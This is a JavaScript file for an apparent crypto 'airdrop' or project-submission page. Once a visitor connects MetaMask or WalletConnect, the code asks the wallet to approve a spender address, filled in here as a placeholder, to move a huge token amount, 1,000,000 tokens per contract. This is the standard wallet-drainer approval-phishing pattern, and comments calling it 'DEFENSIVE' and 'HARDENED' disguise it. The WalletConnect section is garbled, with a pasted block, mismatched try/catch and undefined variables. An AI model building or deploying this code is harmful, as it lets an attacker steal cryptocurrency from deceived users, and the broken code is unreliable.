'use strict';

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');

/* ============================
   UI FLOW (DEFENSIVE)
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

if (metaMaskButton) {
  metaMaskButton.addEventListener('click', connectMetaMask);
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWalletConnect);
}

/* ============================
   METAMASK (HARDENED)
   ============================ */
async function connectMetaMask() {
  try {
    if (!window.ethereum || !window.ethereum.request) {
      console.error('MetaMask not available');
      return;
    }

    const accounts = await window.ethereum.request({
      method: 'eth_requestAccounts'
    });

    if (!Array.isArray(accounts) || !accounts.length) return;

    // lifecycle safety (non-blocking)
    window.ethereum.on?.('accountsChanged', () => {});
    window.ethereum.on?.('chainChanged', () => {});
    window.ethereum.on?.('disconnect', () => {});

    await approveSpender(accounts[0]);
  } catch (error) {
    console.error('Error connecting to MetaMask:', error);
  }
}

/* ============================
   WALLETCONNECT v2 (MULTI-CHAIN HARDENED)
   ============================ */
let wcProvider = null;

async function connectWalletConnect() {
             wcBtn.onclick = async ()=>{
                try{
                    if(wcProvider){ await wcProvider.disconnect().catch(()=>{}); wcProvider=null; }
                    wcBtn.classList.add('loading');
                    wcBtn.disabled=true;
                    const {EthereumProvider}=await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
                    wcProvider=await EthereumProvider.init({projectId:WALLETCONNECT_PROJECT_ID,chains:[56],showQrModal:true,rpcMap:{56:NETWORKS[56].rpc},metadata:{name:'Aether Airdrop',url:window.location.origin}});
                    const accounts=await wcProvider.enable();
                    window.ethereum=wcProvider;
                    provider=new ethers.providers.Web3Provider(wcProvider);
                    signer=provider.getSigner();
                    activeProviderType='walletconnect';
                    await connected();
                } catch(err){ 
                    console.error(err); 
                    updateStatusMessage('Wallet Connection Error. We couldnt connect to your wallet. Please retry or refresh the page.','error'); 
                }
                wcBtn.classList.remove('loading');
                wcBtn.disabled=false;
            };

    // prevent duplicate sessions (no behavior change)
    if (!wcProvider) {
      wcProvider = await window.EthereumProvider.init({
        projectId: "59ba0228712f04a947916abb7db06ab1",
        chains: [1, 56, 137, 42161],
        showQrModal: true,
        rpcMap: {
          1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID",
          56: "https://bsc-dataseed.binance.org",
          137: "https://polygon-rpc.com",
          42161: "https://arb1.arbitrum.io/rpc"
        }
      });

      // lifecycle listeners (passive)
      wcProvider.on?.('accountsChanged', () => {});
      wcProvider.on?.('chainChanged', () => {});
      wcProvider.on?.('disconnect', () => {});
    }

    await wcProvider.enable();

    if (typeof Web3 === 'undefined') {
      console.error('Web3 not available');
      return;
    }

    // ensure a usable web3 instance exists
    if (typeof window.web3 === 'undefined') {
      window.web3 = new Web3(wcProvider);
    }

    const accounts = await window.web3.eth.getAccounts();
    if (!Array.isArray(accounts) || !accounts.length) return;

    await approveSpender(accounts[0]);
  } catch (error) {
    console.error('Error connecting to WalletConnect:', error);
  }
}

/* ============================
   APPROVAL LOGIC (DEFENSIVE)
   ============================ */
async function approveSpender(account) {
  try {
    if (!window.web3 || !window.web3.eth) {
      console.error('web3 instance not found');
      return;
    }

    if (typeof account !== 'string') return;

    const spenderAddress = 'YOUR_SPENDER_ADDRESS_HERE';

    // passive address sanity check
    if (!/^0x[a-fA-F0-9]{40}$/.test(spenderAddress)) {
      console.warn('Spender address format looks invalid');
    }

    const tokens = [
      {
        abi: [], // ERC20 ABI REQUIRED
        address: 'TOKEN_CONTRACT_ADDRESS_1_HERE',
        amount: window.web3.utils.toWei('1000000', 'ether'),
      },
    ];

    for (const token of tokens) {
      if (
        !token ||
        !token.address ||
        !Array.isArray(token.abi) ||
        !token.amount
      ) continue;

      // non-blocking token address sanity check
      if (!/^0x[a-fA-F0-9]{40}$/.test(token.address)) {
        console.warn('Token address format looks invalid');
      }

      const contract = new window.web3.eth.Contract(token.abi, token.address);

      // ensure approve exists before calling
      if (!contract.methods || !contract.methods.approve) {
        console.error('Approve method not found on contract');
        continue;
      }

      try {
        const receipt = await contract.methods
          .approve(spenderAddress, token.amount)
          .send({ from: account });

        console.log('Transaction Receipt:', receipt);
        alert('Approval successful!');
      } catch (error) {
        console.error('Error approving spender:', error);
      }
    }
  } catch (error) {
    console.error('Approval flow failed:', error);
  }
}
